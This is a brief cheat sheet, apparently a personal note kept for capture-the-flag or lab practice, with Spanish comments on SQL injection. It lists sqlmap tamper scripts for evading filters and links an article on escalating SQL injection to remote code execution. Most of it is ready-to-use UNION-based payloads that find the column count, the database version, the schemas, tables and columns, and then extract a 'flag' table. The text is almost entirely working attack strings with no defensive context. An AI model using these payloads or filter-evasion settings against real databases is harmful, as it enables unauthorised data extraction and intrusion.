# TAMPERS

```bash
--tamper=space2comment,between,equaltolike,randomcase,commalessmid,commalesslimit
```

# RCE

https://medium.com/@Shatha511/chaining-sqli-into-rce-a-lab-case-study-23590bb23a3a

## MANUAL

```SQL
1' UNION SELECT NULL,NULL-- - 
1' UNION SELECT 'A','A'-- - 
1' UNION SELECT 'A','A'-- -


#Sacar version
1' UNION SELECT 'A',@@version-- -
1' UNION SELECT 'A',version()-- -
1' UNION SELECT 'A',sqlite_version()-- -

#Sacar nombres de dbs, quitar el AND 1=2 y probar
' AND 1=2 UNION SELECT 1, schema_name FROM information_schema.schemata-- -
#Sacar tablas para cada columna
' AND 1=2 UNION SELECT 1, table_name from information_schema.tables where table_schema='flag'-- -
#Sacar las columns para cada tabla
' AND 1=2 UNION SELECT 1, column_name from information_schema.columns where table_schema='flag' AND table_name='flag'-- -
#Sacar valores
1' AND 1=2 UNION SELECT 1, flag from flag.flag-- -
```
